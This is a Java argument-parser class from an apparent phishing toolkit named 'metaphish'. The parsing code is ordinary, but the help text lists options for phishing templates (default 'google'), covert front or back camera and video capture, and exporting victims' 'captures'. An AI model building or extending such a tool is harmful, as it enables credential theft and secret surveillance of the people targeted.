package com.metaphish.util;

import java.util.HashMap;
import java.util.Map;

public final class ArgsParser {
    private final Map<String, String> Values = new HashMap<>();
    private final Map<String, Boolean> Flags  = new HashMap<>();

    private ArgsParser() {}

    public static ArgsParser Parse(String[] Arguments) {
        ArgsParser Parser = new ArgsParser();
        for (int Index = 0; Index < Arguments.length; Index++) {
            String Arg = Arguments[Index];
            if (Arg.startsWith("--")) {
                String Key = Arg.substring(2);
                if (Index + 1 < Arguments.length && !Arguments[Index + 1].startsWith("-")) {
                    Parser.Values.put(Key, Arguments[++Index]);
                } else {
                    Parser.Flags.put(Key, true);
                }
            } else if (Arg.startsWith("-") && Arg.length() == 2) {
                String Key = Arg.substring(1);
                if (Index + 1 < Arguments.length && !Arguments[Index + 1].startsWith("-")) {
                    Parser.Values.put(Key, Arguments[++Index]);
                } else {
                    Parser.Flags.put(Key, true);
                }
            }
        }
        return Parser;
    }

    public boolean Has(String... Keys) {
        for (String Key : Keys) {
            if (Flags.containsKey(Key) || Values.containsKey(Key)) return true;
        }
        return false;
    }

    public String Get(String DefaultValue, String... Keys) {
        for (String Key : Keys) {
            if (Values.containsKey(Key)) return Values.get(Key);
        }
        return DefaultValue;
    }

    public void PrintHelp() {
        System.out.println("Usage: java -jar metaphish.jar [OPTIONS]");
        System.out.println();
        System.out.println("Options:");
        System.out.println("  -c, --config <file>          Config file path (default: metaphish.properties)");
        System.out.println("  -s, --host <host>            Bind host (default: 0.0.0.0)");
        System.out.println("  -p, --port <port>            Bind port (default: 8080)");
        System.out.println("  -t, --template <name>        Phishing template (default: google)");
        System.out.println("  -u, --username <name>        Admin username (default: admin)");
        System.out.println("  -P, --password <pass>        Admin password");
        System.out.println("      --ssl                    Enable HTTPS");
        System.out.println("      --log-level <level>      Log level: VERBOSE|DEBUG|INFO|WARN|ERROR");
        System.out.println("      --camera-mode <mode>     Camera mode: front|back|both|video");
        System.out.println("      --video-source <src>     Video source when camera-mode=video: front|back|both (default: front)");
        System.out.println("      --video-duration <secs>  Video capture duration in seconds (default: 10)");
        System.out.println("      --export                 Export all captures to file and exit");
        System.out.println("      --show-captures          Print all captures and exit");
        System.out.println("      --clear-captures         Delete all capture data and exit");
        System.out.println("  -v, --verbose                Verbose output");
        System.out.println("  -h, --help                   Show this help");
    }
}
